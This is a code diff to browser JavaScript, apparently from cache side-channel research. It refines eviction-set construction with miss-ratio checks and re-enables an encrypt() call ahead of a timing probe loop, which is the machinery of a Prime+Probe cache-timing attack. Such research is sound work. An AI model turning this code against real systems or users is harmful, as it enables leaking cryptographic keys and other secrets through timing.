@@ -69,10 +69,19 @@ class EvictionSetGenerator {
     }
     measureTimedMiss(timed_miss, probe, evsetPtr, num_measurements=this.config.num_measurements) {
         let t = 0;
+        let hit = 0;
+        let miss = 0;
         for (let i = 0; i < num_measurements; i++) {
-            t += timed_miss(probe, evsetPtr);
+            const a = timed_miss(probe, evsetPtr);
+            t += a;
+            if(a < this.config.threshold) {
+                hit++;
+            } else {
+                miss++;
+            }
         }
-        return t / this.config.num_measurements;
+        const miss_ratio = miss / (hit + miss)
+        return [t / this.config.num_measurements, miss_ratio];
     }
     setupLinkedList(indices) {
         if (indices.length == 0) {
@@ -106,8 +115,8 @@ class EvictionSetGenerator {
             }
             this.setupLinkedList(indices);
             if (target) {
-                let t = this.measureTimedMiss(timed_miss, target, indices[0]);
-                evicted = t >= this.config.threshold;
+                let [t, miss_ratio] = this.measureTimedMiss(timed_miss, target, indices[0]);
+                evicted = t >= this.config.threshold && miss_ratio >= this.config.minimal_miss_ratio
                 if(!evicted) {
                     console.log(".")
                 }
@@ -156,11 +165,11 @@ class EvictionSetGenerator {
             let i = 0;
             for(; i < nchunks && !found; i++) {
                 this.unlinkChunk(evset, removedChunks, nchunks, i);
-                let t = this.measureTimedMiss(timed_miss, probe, evset[0]);
-                if(t < this.config.threshold) {
+                let [t, miss_ratio] = this.measureTimedMiss(timed_miss, probe, evset[0]);
+                if(t < this.config.threshold || miss_ratio < this.config.minimal_miss_ratio) {
                     this.relinkChunk(evset, removedChunks);
                 } else {
-                    console.log("-", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length, "chunk_idx removed:", i, "t:", t);
+                    console.log("-", "evset length:", evset.length, "removedChunks length (level):", removedChunks.length, "chunk_idx removed:", i, "t:", t, "miss_ratio:", miss_ratio);
                     level++;
                     found = true;
                 }
@@ -250,13 +259,13 @@ self.onmessage = async (event) => {
     for(let i = 0; i < evsets.length; i++) {
         do {
             evsets[i] = evGenerator.reduceToEvictionSet(timed_miss, candidates, config.probe[i])
-        } while(evsets[i].length > 12);
+        } while(evsets[i].length > config.associativity);
         console.log("evset[", i, "] created with size: ", evsets[i].length);
         evGenerator.setupLinkedList(evsets[i])
     }
-    const conflictSet = evGenerator.generateConflictSet(evsets);
-    console.log(conflictSet)
-    console.log("conflict set created with size: ", conflictSet.length);
+    // const conflictSet = evGenerator.generateConflictSet(evsets);
+    // console.log(conflictSet)
+    // console.log("conflict set created with size: ", conflictSet.length);
 
 
     const time_slot_size = config.time_slot_size
@@ -274,9 +283,9 @@ self.onmessage = async (event) => {
         memDataView.setUint32(victimsPtr + 4 * i, targets[i], true)
     }
     const startTime = new Date();
-    // encrypt();
+    encrypt();
     probe_loop(num_addrs, victimsPtr, evsetsPtr, resultsPtr, memDataView.byteLength, time_slot_size)
-    // const results = new Uint32Array(total_num_results);
+    const results = new Uint32Array(total_num_results);
     // for(let i = 0; i < total_num_results; i += num_addrs) {
     //     for(let j = 0; j < num_addrs; j++) {
     //         // access(targets[j])
@@ -290,15 +299,14 @@ self.onmessage = async (event) => {
     const testTime = new Date(new Date() - startTime);
     console.log(`test took: ${testTime.getMinutes()} mins, ${testTime.getSeconds()} secs and ${testTime.getMilliseconds()} ms`)
     let numEvicted = 0
-    const results = new Uint32Array(total_num_results);
     for(let i = 0; i < results.length; i++) {
         const value = memDataView.getUint32(resultsPtr + 4 * i, true)
+        results[i] = value
         // results[i] =  value < config.threshold ? 1 : 0;
         // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true) < config.threshold ? 1 : 0;
         // results[i] = memDataView.getUint32(resultsPtr + 4 * i, true)
         // results[i] = 30 > value && value < 40 ? 1 : 0;
         // results[i] = value < config.threshold ? 1 : 0;
-        results[i] = value
 
         if(results[i] > config.threshold) numEvicted++;
     }
